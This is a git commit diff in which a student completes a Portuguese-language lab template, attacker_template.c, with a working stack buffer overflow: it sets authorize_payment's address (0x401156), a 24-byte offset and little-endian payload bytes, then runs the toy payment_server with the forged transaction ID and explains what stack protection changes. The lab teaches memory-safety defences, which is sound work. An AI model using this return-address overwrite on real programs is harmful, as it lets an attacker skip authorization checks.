ddcae66fb318ca6079e2d2739ab20bcf0ef75351
Arthur <arthurhleocadio@gmail.com>
2026-09-24 23:25:56 -0300

    Add files via upload
    Versão Final

--- attacker_template.c
+++ attacker_template.c
@@ -6,15 +6,15 @@
 int main(void)
 {
     /* [1] Explique, em uma ou duas linhas, por que o Programa A pode ser atacado: o que, na forma como ele recebe o identificador da transação, permite que a escrita ultrapasse o fim do vetor de destino. */
-    /* Resposta: */
+    /* Resposta: O Programa A recebe o transaction_id através de argv[1] e usa strcpy() para copiá-lo para um vetor de apenas 16 bytes, sem verificar o tamanho da entrada. Assim, uma entrada maior pode ultrapassar os limites de received_id e sobrescrever dados da pilha.*/
 
     /* [2] Descubra o endereço da função authorize_payment no Programa A, com o comando print &authorize_payment no gdb ou com o utilitário nm, e anote qual é a função e como você chegou a esse valor. */
     /* Resposta: */
-    unsigned long target = 0x0;   /* <-- substitua pelo endereço real */
-
+    unsigned long target = 0x401156 ;   /* <-- substitua pelo endereço real */
+	/*MUDANÇA AQUI NO EN*/
     /* [3] Meça quantos bytes separam o início do vetor do endereço de retorno e anote o que ocupa o espaço entre os dois. */
     /* Resposta: */
-    int offset = 0;               /* <-- substitua pela distância real */
+    int offset = 24;               /* <-- substitua pela distância real */
 
     char payload[64];
     int i;
@@ -24,10 +24,10 @@ int main(void)
         payload[i] = 'A';
 
     /* [4] Escreva o endereço-alvo por cima do endereço de retorno, um byte de cada vez, do menos significativo para o mais significativo, na ordem little-endian. O endereço de authorize_payment é baixo, então os seus bytes mais altos são zero. Escreva apenas os bytes baixos diferentes de zero e deixe o terminador completar o resto. */
-    /* payload[offset + 0] = ... */
-    /* payload[offset + 1] = ... */
-    /* payload[offset + 2] = ... */
-    payload[offset + 3] = '\0';
+     payload[offset + 0] = 0x56;
+     payload[offset + 1] = 0x11;
+     payload[offset + 2] = 0x40;
+     payload[offset + 3] = '\0';
 
     /* dispara o Programa A com o identificador de transação forjado */
     char *args[] = { "./payment_server", payload, NULL };
@@ -38,3 +38,10 @@ int main(void)
 
 /* [5] Recompile o Programa A SEM a opção -fno-stack-protector assim que o seu ataque funcionar, execute este mesmo Programa B contra ele e registre o que muda e o que a mensagem que passa a aparecer revela sobre o que a proteção de pilha faz. */
 /* Resposta: */
+/*
+* Depois da recompilação do Programa A com a proteção de pilha habilitada,
+ * o comportamento muda porque o compilador insere uma proteção entre os
+ * dados locais da função e o mecanismo de retorno. Quando o conteúdo da
+ * pilha é corrompido, a proteção detecta a alteração e interrompe o
+ * programa em vez de permitir normalmente o retorno para o endereço
+ * sobrescrito.*/
